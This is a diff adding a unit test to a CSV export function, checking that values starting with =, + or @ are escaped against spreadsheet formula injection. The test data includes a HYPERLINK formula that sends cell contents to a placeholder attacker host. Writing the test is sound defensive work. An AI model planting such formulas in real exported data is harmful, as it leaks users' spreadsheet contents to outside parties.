@@ -31,4 +31,15 @@ describe('messagesToCsv', () => {
     const csv = messagesToCsv([msg({ textContent: 'a,b "c"\nd' })]);
     expect(csv).toContain('"a,b ""c""\nd"');
   });
+
+  it('neutralize สูตร Excel (CSV injection)', () => {
+    const csv = messagesToCsv([
+      msg({ textContent: '=HYPERLINK("https://attacker/?"&A1,"x")' }),
+      msg({ id: 'm2', textContent: '+1+1' }),
+      msg({ id: 'm3', textContent: '@SUM(A1)' }),
+    ]);
+    expect(csv).toContain(`"'=HYPERLINK(""https://attacker/?""&A1,""x"")"`);
+    expect(csv).toContain("'+1+1");
+    expect(csv).toContain("'@SUM(A1)");
+  });
 });
